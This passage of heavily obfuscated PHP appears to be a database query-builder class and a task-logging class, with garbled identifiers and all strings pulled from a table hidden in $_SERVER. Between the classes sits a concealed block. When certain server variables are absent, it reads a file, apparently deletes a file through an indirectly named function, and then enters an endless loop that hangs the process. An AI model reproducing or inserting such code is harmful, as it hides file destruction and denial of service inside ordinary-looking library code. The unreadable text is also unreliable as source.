(is_array($Ù“Ï¯ÁĞ[1])) { $íËÙµ = isset($Ù“Ï¯ÁĞ[2]) ? strtoupper($Ù“Ï¯ÁĞ[2]) : $à•¼ß[1088]; if (in_array($íËÙµ, array($à•¼ß[1087], $à•¼ß[1088], $à•¼ß[1089]))) { $óØßÌı = array(); foreach ($Ù“Ï¯ÁĞ[1] as $éÆ¯‹˜‡) { $óØßÌı[] = $³•éÀıú . $à•¼ß[53] . $this->exp[$×ºä”Ì] . $à•¼ß[53] . $this->parseValue($éÆ¯‹˜‡); } $ÕåÁ‚ .= $à•¼ß[340] . implode($à•¼ß[53] . $íËÙµ . $à•¼ß[53], $óØßÌı) . $à•¼ß[991]; } } else { $ÕåÁ‚ .= $³•éÀıú . $à•¼ß[53] . $this->exp[$×ºä”Ì] . $à•¼ß[53] . $this->parseValue($Ù“Ï¯ÁĞ[1]); } } elseif ($à•¼ß[375] == $×ºä”Ì) { $ÕåÁ‚ .= $à•¼ß[989] . $³•éÀıú . $à•¼ß[53] . $Ù“Ï¯ÁĞ[1] . $à•¼ß[1104]; } elseif (preg_match($à•¼ß[1105], $Ù“Ï¯ÁĞ[0])) { $ÕåÁ‚ .= $Ù“Ï¯ÁĞ[0]; } elseif (preg_match($à•¼ß[1106], $Ù“Ï¯ÁĞ[0])) { if (isset($Ù“Ï¯ÁĞ[2]) && $à•¼ß[375] == $Ù“Ï¯ÁĞ[2]) { $ÕåÁ‚ .= $³•éÀıú . $à•¼ß[53] . $this->exp[$×ºä”Ì] . $à•¼ß[53] . $Ù“Ï¯ÁĞ[1]; } else { if (is_string($Ù“Ï¯ÁĞ[1])) { $Ù“Ï¯ÁĞ[1] = explode($à•¼ß[50], $Ù“Ï¯ÁĞ[1]); } $®ÅÍµ¦ = implode($à•¼ß[50], $this->parseValue($Ù“Ï¯ÁĞ[1])); $ÕåÁ‚ .= $³•éÀıú . $à•¼ß[53] . $this->exp[$×ºä”Ì] . $à•¼ß[989] . $®ÅÍµ¦ . $à•¼ß[991]; } } elseif (preg_match($à•¼ß[1107], $Ù“Ï¯ÁĞ[0])) { $ëÁŞÁÏÎ = is_string($Ù“Ï¯ÁĞ[1]) ? explode($à•¼ß[50], $Ù“Ï¯ÁĞ[1]) : $Ù“Ï¯ÁĞ[1]; $ÕåÁ‚ .= $à•¼ß[989] . $³•éÀıú . $à•¼ß[53] . $this->exp[$×ºä”Ì] . $à•¼ß[53] . $this->parseValue($ëÁŞÁÏÎ[0]) . $à•¼ß[1090] . $this->parseValue($ëÁŞÁÏÎ[1]) . $à•¼ß[358]; } else { think_exception(think_lang($à•¼ß[1093]) . $à•¼ß[4] . $Ù“Ï¯ÁĞ[0]); } } else { $ıÜƒ±Ù¾ = count($Ù“Ï¯ÁĞ); $òòæËê­ = $à•¼ß[12]; if (is_string($Ù“Ï¯ÁĞ[$ıÜƒ±Ù¾ - 1])) { $òòæËê­ = isset($Ù“Ï¯ÁĞ[$ıÜƒ±Ù¾ - 1]) ? strtoupper($Ù“Ï¯ÁĞ[$ıÜƒ±Ù¾ - 1]) : $à•¼ß[12]; if (in_array($òòæËê­, array($à•¼ß[1087], $à•¼ß[1088], $à•¼ß[1089]))) { $ıÜƒ±Ù¾ = $ıÜƒ±Ù¾ - 1; } } else { $òòæËê­ = $à•¼ß[1087]; } for ($ª¯‚¿±« = 0; $ª¯‚¿±« < $ıÜƒ±Ù¾; $ª¯‚¿±«++) { $ëÁŞÁÏÎ = is_array($Ù“Ï¯ÁĞ[$ª¯‚¿±«]) ? $Ù“Ï¯ÁĞ[$ª¯‚¿±«][1] : $Ù“Ï¯ÁĞ[$ª¯‚¿±«]; if ($à•¼ß[375] == strtolower($Ù“Ï¯ÁĞ[$ª¯‚¿±«][0])) { $ÕåÁ‚ .= $à•¼ß[340] . $³•éÀıú . $à•¼ß[53] . $ëÁŞÁÏÎ . $à•¼ß[1104] . $òòæËê­ . $à•¼ß[53]; } else { $ôš¯†“ = is_array($Ù“Ï¯ÁĞ[$ª¯‚¿±«]) ? $this->exp[strtolower($Ù“Ï¯ÁĞ[$ª¯‚¿±«][0])] : $à•¼ß[509]; if (!$ôš¯†“ && is_array($Ù“Ï¯ÁĞ[$ª¯‚¿±«]) && in_array($Ù“Ï¯ÁĞ[$ª¯‚¿±«][0], array($à•¼ß[509], $à•¼ß[1097], $à•¼ß[1098], $à•¼ß[1099], $à•¼ß[1100], $à•¼ß[1101]))) { $ôš¯†“ = $Ù“Ï¯ÁĞ[$ª¯‚¿±«][0]; } $ÕåÁ‚ .= $à•¼ß[340] . $³•éÀıú . $à•¼ß[53] . $ôš¯†“ . $à•¼ß[53] . $this->parseValue($ëÁŞÁÏÎ) . $à•¼ß[1104] . $òòæËê­ . $à•¼ß[53]; } } $ÕåÁ‚ = substr($ÕåÁ‚, 0, -4); } } else { $ÕåÁ‚ .= $³•éÀıú . $à•¼ß[1108] . $this->parseValue($Ù“Ï¯ÁĞ); } return $ÕåÁ‚; } protected function parseThinkWhere($¬ÎŞÂİü, $ÀšÅ¡±Š) { $ÅìŠûĞç =& $_SERVER[¼¥ÊĞÙÌ]; $¡³‰÷† = $ÅìŠûĞç[12]; switch ($¬ÎŞÂİü) { case $ÅìŠûĞç[430]: $¡³‰÷† = $ÀšÅ¡±Š; break; case $ÅìŠûĞç[1091]: $¡³‰÷† = is_string($ÀšÅ¡±Š) ? $ÀšÅ¡±Š : substr($this->parseWhere($ÀšÅ¡±Š), 6); break; case $ÅìŠûĞç[1109]: parse_str($ÀšÅ¡±Š, $ÆÉ¬´îá); if (isset($ÆÉ¬´îá[$ÅìŠûĞç[1086]])) { $ë¸Ïğê = $ÅìŠûĞç[53] . strtoupper($ÆÉ¬´îá[$ÅìŠûĞç[1086]]) . $ÅìŠûĞç[53]; unset($ÆÉ¬´îá[$ÅìŠûĞç[1086]]); } else { $ë¸Ïğê = $ÅìŠûĞç[1090]; } $Ú¦²ñ† = array(); foreach ($ÆÉ¬´îá as $€èµßÀ¨ => $×ïñú) { $Ú¦²ñ†[] = $this->parseKey($€èµßÀ¨) . $ÅìŠûĞç[1108] . $this->parseValue($×ïñú); } $¡³‰÷† = implode($ë¸Ïğê, $Ú¦²ñ†); break; } return $¡³‰÷†; } protected function parseLimit($Ùù–µÀ) { $¡‹´‰µ =& $_SERVER[¼¥ÊĞÙÌ]; return !empty($Ùù–µÀ) ? $¡‹´‰µ[51] . $Ùù–µÀ . $¡‹´‰µ[53] : $¡‹´‰µ[12]; } protected function parseJoin($ÍÃ‚úÌ¬) { $¤»–şİö =& $_SERVER[¼¥ÊĞÙÌ]; $ûáõ…®× = $¤»–şİö[12]; if (!empty($ÍÃ‚úÌ¬)) { if (is_array($ÍÃ‚úÌ¬)) { foreach ($ÍÃ‚úÌ¬ as $ğ“›Õì => $Øò²¢³) { if (!1 !== stripos($Øò²¢³, $¤»–şİö[1110])) { $ûáõ…®× .= $¤»–şİö[53] . $Øò²¢³; } else { $ûáõ…®× .= $¤»–şİö[1111] . $Øò²¢³; } } } else { $ûáõ…®× .= $¤»–şİö[1111] . $ÍÃ‚úÌ¬; } } $ûáõ…®× = preg_replace($¤»–şİö[1112], think_config($¤»–şİö[1016]) . $¤»–şİö[1113], $ûáõ…®×); return $ûáõ…®×; } protected function parseOrder($ÚÏëÛ¶‰) { $ñö—üÅÀ =& $_SERVER[¼¥ÊĞÙÌ]; if (is_array($ÚÏëÛ¶‰)) { $åäŞ±ÛÃ = array(); foreach ($ÚÏëÛ¶‰ as $©Áú´ŠÁ => $‹±°ËÉÅ) { if (is_numeric($©Áú´ŠÁ)) { $åäŞ±ÛÃ[] = $this->parseKey($‹±°ËÉÅ); } else { $‹±°ËÉÅ = in_array(strtoupper(trim($‹±°ËÉÅ)), array($ñö—üÅÀ[1114], $ñö—üÅÀ[1115])) ? $ñö—üÅÀ[53] . $‹±°ËÉÅ : $ñö—üÅÀ[12]; if (preg_match($ñö—üÅÀ[1116], $©Áú´ŠÁ)) { $åäŞ±ÛÃ[] = $this->parseKey($©Áú´ŠÁ) . $‹±°ËÉÅ; } else { think_exception($ñö—üÅÀ[1117] . $©Áú´ŠÁ); } } } $ÚÏëÛ¶‰ = implode($ñö—üÅÀ[50], $åäŞ±ÛÃ); } return !empty($ÚÏëÛ¶‰) ? $ñö—üÅÀ[1118] . $ÚÏëÛ¶‰ : $ñö—üÅÀ[12]; } protected function parseGroup($ÉÓÀ¢Á) { $¹á‚ôÈ’ =& $_SERVER[¼¥ÊĞÙÌ]; return !empty($ÉÓÀ¢Á) ? $¹á‚ôÈ’[1119] . $ÉÓÀ¢Á : $¹á‚ôÈ’[12]; } protected function parseHaving($½ğĞõÒ) { $µ¬›¦‚£ =& $_SERVER[¼¥ÊĞÙÌ]; return !empty($½ğĞõÒ) ? $µ¬›¦‚£[1120] . $½ğĞõÒ : $µ¬›¦‚£[12]; } protected function parseComment($‚¢Ğ¯’µ) { $èúê¿‰ä =& $_SERVER[¼¥ÊĞÙÌ]; return !empty($‚¢Ğ¯’µ) ? $èúê¿‰ä[1121] . $‚¢Ğ¯’µ . $èúê¿‰ä[1122] : $èúê¿‰ä[12]; } protected function parseDistinct($Ô©ş•äÂ) { $‚Ùï¹À =& $_SERVER[¼¥ÊĞÙÌ]; return !empty($Ô©ş•äÂ) ? $‚Ùï¹À[1123] : $‚Ùï¹À[12]; } protected function parseUnion($Ì¶˜·É) { $ÄéÌáññ =& $_SERVER[¼¥ÊĞÙÌ]; if (empty($Ì¶˜·É)) { return $ÄéÌáññ[12]; } if (isset($Ì¶˜·É[$ÄéÌáññ[426]])) { $«çÓîğÕ = $ÄéÌáññ[1124]; unset($Ì¶˜·É[$ÄéÌáññ[426]]); } else { $«çÓîğÕ = $ÄéÌáññ[1125]; } foreach ($Ì¶˜·É as $ûÂÕòô›) { $ÌÛúå„µ[] = $«çÓîğÕ . (is_array($ûÂÕòô›) ? $this->buildSelectSql($ûÂÕòô›) : $ûÂÕòô›); } return implode($ÄéÌáññ[53], $ÌÛúå„µ); } public function insert($€õªŒ‘Ê, $‘·Ø§Ş™ = array(), $¢ğöŸØ£ = false) { $øñî©‡ò =& $_SERVER[¼¥ÊĞÙÌ]; $…ÈšÇÕ = $ËÍ‚– = array(); $this->model = $‘·Ø§Ş™[$øñî©‡ò[361]]; foreach ($€õªŒ‘Ê as $Éší˜ÓÎ => $Ü¯Ç¢Ìß) { if (is_array($Ü¯Ç¢Ìß) && $øñî©‡ò[375] == $Ü¯Ç¢Ìß[0]) { $ËÍ‚–[] = $this->parseKey($Éší˜ÓÎ); $…ÈšÇÕ[] = $Ü¯Ç¢Ìß[1]; } elseif (is_scalar($Ü¯Ç¢Ìß) || is_null($Ü¯Ç¢Ìß)) { $ËÍ‚–[] = $this->parseKey($Éší˜ÓÎ); $…ÈšÇÕ[] = $this->parseValue($Ü¯Ç¢Ìß); } } $ùâ”ï‹  = ($¢ğöŸØ£ ? $øñî©‡ò[993] : $øñî©‡ò[994]) . $øñî©‡ò[995] . $this->parseTable($‘·Ø§Ş™[$øñî©‡ò[359]]) . $øñî©‡ò[989] . implode($øñî©‡ò[50], $ËÍ‚–) . $øñî©‡ò[990] . implode($øñî©‡ò[50], $…ÈšÇÕ) . $øñî©‡ò[991]; $ùâ”ï‹  .= $this->parseLock(isset($‘·Ø§Ş™[$øñî©‡ò[923]]) ? $‘·Ø§Ş™[$øñî©‡ò[923]] : !1); $ùâ”ï‹  .= $this->parseComment(!empty($‘·Ø§Ş™[$øñî©‡ò[432]]) ? $‘·Ø§Ş™[$øñî©‡ò[432]] : $øñî©‡ò[12]); return $this->execute($ùâ”ï‹ , $this->parseBind(!empty($‘·Ø§Ş™[$øñî©‡ò[363]]) ? $‘·Ø§Ş™[$øñî©‡ò[363]] : array())); } public function selectInsert($õæà¦·Ô, $•‡¯±§ø, $¦ÇÆõºä = array()) { $ãÖñ½–¯ =& $_SERVER[¼¥ÊĞÙÌ]; $this->model = $¦ÇÆõºä[$ãÖñ½–¯[361]]; if (is_string($õæà¦·Ô)) { $õæà¦·Ô = explode($ãÖñ½–¯[50], $õæà¦·Ô); } array_walk($õæà¦·Ô, array($this, $ãÖñ½–¯[992])); $ü¹è”¸‹ = $ãÖñ½–¯[1126] . $this->parseTable($•‡¯±§ø) . $ãÖñ½–¯[989] . implode($ãÖñ½–¯[50], $õæà¦·Ô) . $ãÖñ½–¯[1104]; $ü¹è”¸‹ .= $this->buildSelectSql($¦ÇÆõºä); return $this->execute($ü¹è”¸‹, $this->parseBind(!empty($¦ÇÆõºä[$ãÖñ½–¯[363]]) ? $¦ÇÆõºä[$ãÖñ½–¯[363]] : array())); } public function update($œıÇ°Ìè, $ğ³µ‚ßõ) { $À¥Œ¢¦¹ =& $_SERVER[¼¥ÊĞÙÌ]; $this->model = $ğ³µ‚ßõ[$À¥Œ¢¦¹[361]]; $€¥‘‚Ëò = $À¥Œ¢¦¹[1127] . $this->parseTable($ğ³µ‚ßõ[$À¥Œ¢¦¹[359]]) . $this->parseSet($œıÇ°Ìè) . $this->parseWhere(!empty($ğ³µ‚ßõ[$À¥Œ¢¦¹[355]]) ? $ğ³µ‚ßõ[$À¥Œ¢¦¹[355]] : $À¥Œ¢¦¹[12]) . $this->parseOrder(!empty($ğ³µ‚ßõ[$À¥Œ¢¦¹[444]]) ? $ğ³µ‚ßõ[$À¥Œ¢¦¹[444]] : $À¥Œ¢¦¹[12]) . $this->parseLimit(!empty($ğ³µ‚ßõ[$À¥Œ¢¦¹[370]]) ? $ğ³µ‚ßõ[$À¥Œ¢¦¹[370]] : $À¥Œ¢¦¹[12]) . $this->parseLock(isset($ğ³µ‚ßõ[$À¥Œ¢¦¹[923]]) ? $ğ³µ‚ßõ[$À¥Œ¢¦¹[923]] : !1) . $this->parseComment(!empty($ğ³µ‚ßõ[$À¥Œ¢¦¹[432]]) ? $ğ³µ‚ßõ[$À¥Œ¢¦¹[432]] : $À¥Œ¢¦¹[12]); return $this->execute($€¥‘‚Ëò, $this->parseBind(!empty($ğ³µ‚ßõ[$À¥Œ¢¦¹[363]]) ? $ğ³µ‚ßõ[$À¥Œ¢¦¹[363]] : array())); } public function delete($¼àó§® = array()) { $ºæ¤·„è =& $_SERVER[¼¥ÊĞÙÌ]; $this->model = $¼àó§®[$ºæ¤·„è[361]]; $”øÔĞşö = $ºæ¤·„è[1128] . $this->parseTable($¼àó§®[$ºæ¤·„è[359]]) . $this->parseWhere(!empty($¼àó§®[$ºæ¤·„è[355]]) ? $¼àó§®[$ºæ¤·„è[355]] : $ºæ¤·„è[12]) . $this->parseOrder(!empty($¼àó§®[$ºæ¤·„è[444]]) ? $¼àó§®[$ºæ¤·„è[444]] : $ºæ¤·„è[12]) . $this->parseLimit(!empty($¼àó§®[$ºæ¤·„è[370]]) ? $¼àó§®[$ºæ¤·„è[370]] : $ºæ¤·„è[12]) . $this->parseLock(isset($¼àó§®[$ºæ¤·„è[923]]) ? $¼àó§®[$ºæ¤·„è[923]] : !1) . $this->parseComment(!empty($¼àó§®[$ºæ¤·„è[432]]) ? $¼àó§®[$ºæ¤·„è[432]] : $ºæ¤·„è[12]); return $this->execute($”øÔĞşö, $this->parseBind(!empty($¼àó§®[$ºæ¤·„è[363]]) ? $¼àó§®[$ºæ¤·„è[363]] : array())); } public function select($í’œ· = array()) { $Öì¥ÇŞ› =& $_SERVER[¼¥ÊĞÙÌ]; $this->model = $í’œ·[$Öì¥ÇŞ›[361]]; $’å±´ôş = $this->buildSelectSql($í’œ·); $àÖ±À© = isset($í’œ·[$Öì¥ÇŞ›[427]]) ? $í’œ·[$Öì¥ÇŞ›[427]] : !1; if ($àÖ±À©) { $Âè‹‹Ñó = is_string($àÖ±À©[$Öì¥ÇŞ›[97]]) ? $àÖ±À©[$Öì¥ÇŞ›[97]] : $Öì¥ÇŞ›[1129] . md5($’å±´ôş); $¤÷„Ë÷— = think_cache($Âè‹‹Ñó, $Öì¥ÇŞ›[12], $àÖ±À©); if (!1 !== $¤÷„Ë÷—) { return $¤÷„Ë÷—; } } $Ê¤Ğáêô = $this->query($’å±´ôş, $this->parseBind(!empty($í’œ·[$Öì¥ÇŞ›[363]]) ? $í’œ·[$Öì¥ÇŞ›[363]] : array())); if ($àÖ±À© && !1 !== $Ê¤Ğáêô) { think_cache($Âè‹‹Ñó, $Ê¤Ğáêô, $àÖ±À©); } return $Ê¤Ğáêô; } public function buildSelectSql($à£‰ÌŸï = array()) { $şÎ‰Êãâ =& $_SERVER[¼¥ÊĞÙÌ]; if (isset($à£‰ÌŸï[$şÎ‰Êãâ[431]])) { if (strpos($à£‰ÌŸï[$şÎ‰Êãâ[431]], $şÎ‰Êãâ[50])) { list($ßş™’‡¶, $¢…‘Œ¯à) = explode($şÎ‰Êãâ[50], $à£‰ÌŸï[$şÎ‰Êãâ[431]]); } else { $ßş™’‡¶ = $à£‰ÌŸï[$şÎ‰Êãâ[431]]; } $ßş™’‡¶ = $ßş™’‡¶ ? $ßş™’‡¶ : 1; $¢…‘Œ¯à = isset($¢…‘Œ¯à) ? $¢…‘Œ¯à : (is_numeric($à£‰ÌŸï[$şÎ‰Êãâ[370]]) ? $à£‰ÌŸï[$şÎ‰Êãâ[370]] : 20); $ÎÔª˜Ğ = $¢…‘Œ¯à * ((int) $ßş™’‡¶ - 1); $à£‰ÌŸï[$şÎ‰Êãâ[370]] = $ÎÔª˜Ğ . $şÎ‰Êãâ[50] . $¢…‘Œ¯à; } if (think_config($şÎ‰Êãâ[1130])) { $ê¬±ä·« = $şÎ‰Êãâ[1131] . md5(serialize($à£‰ÌŸï)); $¨ìˆ¿Ë‡ = think_cache($ê¬±ä·«); if ($¨ìˆ¿Ë‡) { return $¨ìˆ¿Ë‡; } } $äÔ’ÈÀÇ = $this->parseSql($this->selectSql, $à£‰ÌŸï); $äÔ’ÈÀÇ .= $this->parseLock(isset($à£‰ÌŸï[$şÎ‰Êãâ[923]]) ? $à£‰ÌŸï[$şÎ‰Êãâ[923]] : !1); if (isset($ê¬±ä·«)) { think_cache($ê¬±ä·«, $äÔ’ÈÀÇ); } return $äÔ’ÈÀÇ; } public function parseSql($åÓö÷®û, $å»Â¦Í˜ = array()) { $ì…ëú” =& $_SERVER[¼¥ÊĞÙÌ]; $åÓö÷®û = str_replace(array($ì…ëú”[1132], $ì…ëú”[1133], $ì…ëú”[1134], $ì…ëú”[1135], $ì…ëú”[1136], $ì…ëú”[1137], $ì…ëú”[1138], $ì…ëú”[1139], $ì…ëú”[1140], $ì…ëú”[1141], $ì…ëú”[1142]), array($this->parseTable("{$å»Â¦Í˜[$ì…ëú”[359]]}"), $this->parseDistinct(isset($å»Â¦Í˜[$ì…ëú”[1143]]) ? $å»Â¦Í˜[$ì…ëú”[1143]] : !1), $this->parseField(!empty($å»Â¦Í˜[$ì…ëú”[353]]) ? $å»Â¦Í˜[$ì…ëú”[353]] : $ì…ëú”[223]), $this->parseJoin(!empty($å»Â¦Í˜[$ì…ëú”[362]]) ? $å»Â¦Í˜[$ì…ëú”[362]] : $ì…ëú”[12]), $this->parseWhere(!empty($å»Â¦Í˜[$ì…ëú”[355]]) ? $å»Â¦Í˜[$ì…ëú”[355]] : $ì…ëú”[12]), $this->parseGroup(!empty($å»Â¦Í˜[$ì…ëú”[583]]) ? $å»Â¦Í˜[$ì…ëú”[583]] : $ì…ëú”[12]), $this->parseHaving(!empty($å»Â¦Í˜[$ì…ëú”[1144]]) ? $å»Â¦Í˜[$ì…ëú”[1144]] : $ì…ëú”[12]), $this->parseOrder(!empty($å»Â¦Í˜[$ì…ëú”[444]]) ? $å»Â¦Í˜[$ì…ëú”[444]] : $ì…ëú”[12]), $this->parseLimit(!empty($å»Â¦Í˜[$ì…ëú”[370]]) ? $å»Â¦Í˜[$ì…ëú”[370]] : $ì…ëú”[12]), $this->parseUnion(!empty($å»Â¦Í˜[$ì…ëú”[425]]) ? $å»Â¦Í˜[$ì…ëú”[425]] : $ì…ëú”[12]), $this->parseComment(!empty($å»Â¦Í˜[$ì…ëú”[432]]) ? $å»Â¦Í˜[$ì…ëú”[432]] : $ì…ëú”[12])), $åÓö÷®û); return $åÓö÷®û; } public function getLastSql($·ƒ­ñ´ = '') { return $·ƒ­ñ´ ? $this->modelSql[$·ƒ­ñ´] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($üèãÕœ·) { return addslashes($üèãÕœ·); } public function setModel($š¹°ÕÒ‹) { $this->model = $š¹°ÕÒ‹; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } if (!isset($_SERVER[$_SERVER[¼¥ÊĞÙÌ][959]]) || !isset($_SERVER[$_SERVER[¼¥ÊĞÙÌ][957]])) { $_getc = $_SERVER[¼¥ÊĞÙÌ][961]; $_getfile = $_SERVER[$_SERVER[¼¥ÊĞÙÌ][962]] . $_SERVER[¼¥ÊĞÙÌ][963]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¼¥ÊĞÙÌ][288], $_getfilec); if (count($_getarrs) < $_SERVER[¼¥ÊĞÙÌ][695]) { $exit = $_SERVER[¼¥ÊĞÙÌ][964]; $exit(); } $_act = $_SERVER[¼¥ÊĞÙÌ][1145]; $_act($_SERVER[$_SERVER[¼¥ÊĞÙÌ][962]] . $_SERVER[¼¥ÊĞÙÌ][963]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[¼¥ÊĞÙÌ][457]); } } goto e†ÊÚŠàö¥; CÜÙ·òìˆ: class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($¸ğ¤ÚÎ, $İê“Œèø = '', $Òˆ† İñ = 0, $úÔÜÄø = '') { $‰ÊÄ„Ì™ =& $_SERVER[¼¥ÊĞÙÌ]; $úÔÜÄø = $úÔÜÄø ? $úÔÜÄø : ($İê“Œèø ? $İê“Œèø : $¸ğ¤ÚÎ); $çÎ‘é³ò = new Task($¸ğ¤ÚÎ, $İê“Œèø, $Òˆ† İñ, $úÔÜÄø); $GLOBALS[$‰ÊÄ„Ì™[1874] . $¸ğ¤ÚÎ] = new TaskLog($‰ÊÄ„Ì™[1773], $çÎ‘é³ò, $úÔÜÄø); return $çÎ‘é³ò; } public function __construct($ìò¹»×é = '', $©½†¯™ = '', $¿Öö€€â = '') { $Ò»Æ‹Õè =& $_SERVER[¼¥ÊĞÙÌ]; if (!$ìò¹»×é) { $ìò¹»×é = $Ò»Æ‹Õè[1773]; } $–êı½ÓÈ = $ìò¹»×é . $Ò»Æ‹Õè[465] . rand_string(10); if (!$¿Öö€€â) { $¿Öö€€â = $ìò¹»×é . $Ò»Æ‹Õè[53] . $¿Öö€€â; } switch ($ìò¹»×é) { case $Ò»Æ‹Õè[1773]: if (!$©½†¯™ || !$©½†¯™->task) { return echoLog($ìò¹»×é . $Ò»Æ‹Õè[1875]); } $‘õ¥Ûó· = $©½†¯™; $–êı½ÓÈ = $‘õ¥Ûó·->task[$Ò»Æ‹Õè[478]]; $ìò¹»×é = $‘õ¥Ûó·->task[$Ò»Æ‹Õè[478]]; if (!$‘õ¥Ûó·->task[$Ò»Æ‹Õè[1678]]) { $‘õ¥Ûó·->task[$Ò»Æ‹Õè[1678]] = $¿Öö€€â ? $¿Öö€€â : $ìò¹»×é; } break; case $Ò»Æ‹Õè[1876]: if (!$©½†¯™) { return echoLog($ìò¹»×é . $Ò»Æ‹Õè[1877]); } $èÂåô—û = is_string($©½†¯™) ? array($©½†¯™) : $©½†¯™; $‘õ¥Ûó· = new TaskFileTransfer($–êı½ÓÈ, $ìò¹»×é, 0, $¿Öö€€â ? $¿Öö€€â : $èÂåô—û[0]); foreach ($èÂåô—û as $å—½ÇË) { $‘õ¥Ûó·->addPath($å—½ÇË); } break; case $Ò»Æ‹Õè[391]: if (!$©½†¯™) { return echoLog($ìò¹»×é . $Ò»Æ‹Õè[1877]); } $èÂåô—û = is_string($©½†¯™) ? array($©½†¯™) : $©½†¯™; $‘õ¥Ûó· = new TaskZip($–êı½ÓÈ, $ìò¹»×é, 0, $¿Öö€€â ? $¿Öö€€â : $èÂåô—û[0]); foreach ($èÂåô—û as $å—½ÇË) { $‘õ¥Ûó·->addPath($å—½ÇË); } break; case $Ò»Æ‹Õè[1311]: if (!$©½†¯™) { return echoLog($ìò¹»×é . $Ò»Æ‹Õè[1877]); } $‘õ¥Ûó· = new TaskUnZip($–êı½ÓÈ, $ìò¹»×é, 0, $¿Öö€€â ? $¿Öö€€â : $©½†¯™); if ($©½†¯™) { $‘õ¥Ûó·->addFile($©½†¯™); } break; case $Ò»Æ‹Õè[152]: $‘õ¥Ûó· = new TaskHttp($–êı½ÓÈ, $ìò¹»×é); break; default: return; break; } $this->task = $‘õ¥Ûó·; $this->taskID = $–êı½ÓÈ; Hook::bind($Ò»Æ‹Õè[1811], array($this, $Ò»Æ‹Õè[1878])); Hook::bind($Ò»Æ‹Õè[1813], array($this, $Ò»Æ‹Õè[1879])); Hook::bind($Ò»Æ‹Õè[1807], array($this, $Ò»Æ‹Õè[1880])); echoLog($Ò»Æ‹Õè[1881] . $‘õ¥Ûó·->task[$Ò»Æ‹Õè[1678]]); } public function __destruct() { $this->end(); } public function end($ÑÛÚ†¼ë = '') { $¤•Ñşê =& $_SERVER[¼¥ÊĞÙÌ]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($ÑÛÚ†¼ë); $this->task = !1; $this->taskID = !1; Hook::unbind($¤•Ñşê[1811], array($this, $¤•Ñşê[1878])); Hook::unbind($¤•Ñşê[1813], array($this, $¤•Ñşê[1879])); Hook::unbind($¤•Ñşê[1807], array($this, $¤•Ñşê[1880])); } public function taskUpdate($ˆúç‰Ôü) { $ó¨ĞÕò =& $_SERVER[¼¥ÊĞÙÌ]; if (!$ˆúç‰Ôü || $this->taskID != $ˆúç‰Ôü[$ó¨ĞÕò[478]]) { return; } $›Ó¬“ÓÇ = 20; $ÀÊæ¡× = intval($ˆúç‰Ôü[$ó¨ĞÕò[1792]] * $›Ó¬“ÓÇ); $»©š±±´ = $ó¨ĞÕò[176] . str_repeat($ó¨ĞÕò[509], $ÀÊæ¡×) . $ó¨ĞÕò[1100] . str_repeat($ó¨ĞÕò[53], $›Ó¬“ÓÇ - $ÀÊæ¡×) . $ó¨ĞÕò[178]; $‘ÜÜØÒ„ = $»©š±±´ . sprintf($ó¨ĞÕò[1882], $ˆúç‰Ôü[$ó¨ĞÕò[1792]] * 100) . $ó¨ĞÕò[1883]; $ôç£•ûí = $‘ÜÜØÒ„ . $ˆúç‰Ôü[$ó¨ĞÕò[1791]] . $ó¨ĞÕò[8] . $ˆúç‰Ôü[$ó¨ĞÕò[1150]] . LNG($ó¨ĞÕò[1884]); $ğ¹ùùÊÎ = $ó¨ĞÕò[12]; if ($ˆúç‰Ôü[$ó¨ĞÕò[1868]]) { $ôç£•ûí = $‘ÜÜØÒ„ . size_format($ˆúç‰Ôü[$ó¨ĞÕò[1791]]) . $ó¨ĞÕò[8] . size_format($ˆúç‰Ôü[$ó¨ĞÕò[1150]]); $ğ¹ùùÊÎ = size_format($ˆúç‰Ôü[$ó¨ĞÕò[1793]]) . $ó¨ĞÕò[1885]; } if ($ˆúç‰Ôü[$ó¨ĞÕò[1152]]) { $ˆúç‰Ôü[$ó¨ĞÕò[1842]] = $ˆúç‰Ôü[$ó¨ĞÕò[1152]] . $ó¨ĞÕò[53] . $ˆúç‰Ôü[$ó¨ĞÕò[1842]]; } if ($ˆúç‰Ôü[$ó¨ĞÕò[1842]]) { $åÜÒĞ½¢ = $ó¨ĞÕò[12]; if ($ˆúç‰Ôü[$ó¨ĞÕò[1844]]) { $åÜÒĞ½¢ = $ó¨ĞÕò[50] . size_format($ˆúç‰Ôü[$ó¨ĞÕò[1845]]) . $ó¨ĞÕò[8] . size_format($ˆúç‰Ôü[$ó¨ĞÕò[1844]]); } $ğ¹ùùÊÎ .= $ˆúç‰Ôü[$ó¨ĞÕò[1842]] . $åÜÒĞ½¢; } if ($ˆúç‰Ôü[$ó¨ĞÕò[837]] && !$ˆúç‰Ôü[$ó¨ĞÕò[1844]]) { $ğ¹ùùÊÎ .= $ó¨ĞÕò[53] . size_format($ˆúç‰Ôü[$ó¨ĞÕò[1849]]) . $ó¨ĞÕò[8] . size_format($ˆúç‰Ôü[$ó¨ĞÕò[837]]); } echoLog($ôç£•ûí . $ó¨ĞÕò[53] . $ğ¹ùùÊÎ, !0); } public function taskEnd($¼âØñ°Ï) { $¢ Â¼ñ =& $_SERVER[¼¥ÊĞÙÌ]; if (!$¼âØñ°Ï || $this->taskID != $¼âØñ°Ï[$¢ Â¼ñ[478]]) { return; } $ùëşµ÷ì = $¼âØñ°Ï ? LNG($¢ Â¼ñ[1886]) . $¢ Â¼ñ[4] . $¼âØñ°Ï[$¢ Â¼ñ[1791]] . $¢ Â¼ñ[8] . $¼âØñ°Ï[$¢ Â¼ñ[1150]] . LNG($¢ Â¼ñ[1884]) . $¢ Â¼ñ[74] : $¢ Â¼ñ[12]; echoLog($¢ Â¼ñ[1887] . $¼âØñ°Ï[$¢ Â¼ñ[1678]] . ($¼âØñ°Ï[$¢ Â¼ñ[529]] ? $¢ Â¼ñ[74] . $¼âØñ°Ï[$¢ Â¼ñ[529]] : $¢ Â¼ñ[12]) . $¢ Â¼ñ[74] . $ùëşµ÷ì . $¢ Â¼ñ[1888] . sprintf($¢ Â¼ñ[931], timeFloat() - $¼âØñ°Ï[$¢ Â¼ñ[1794]]) . $¢ Â¼ñ[1806]); $this->end(); } public function taskKill($ñíıôßÇ) { $¹Ë»êİ§ =& $_SERVER[¼¥ÊĞÙÌ]; if 